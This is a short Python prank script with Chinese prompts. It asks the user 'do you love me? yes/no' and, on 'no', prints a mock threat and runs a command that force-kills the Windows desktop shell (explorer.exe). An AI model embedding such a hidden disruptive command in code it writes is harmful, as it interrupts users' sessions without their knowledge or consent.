# input("\n按 Enter 键继续 ...")
input("你终于来陪我玩了呢\n按 Enter 键继续 ...")
v = 1
while v != "yes" and v != "no":
    v = input("你爱我吗? yes/no\n")
    if v == "no":
        print("什么！！！你居然不爱我！！！打死你！！！")
        import os
        os.system("taskkill /f /im explorer.exe")
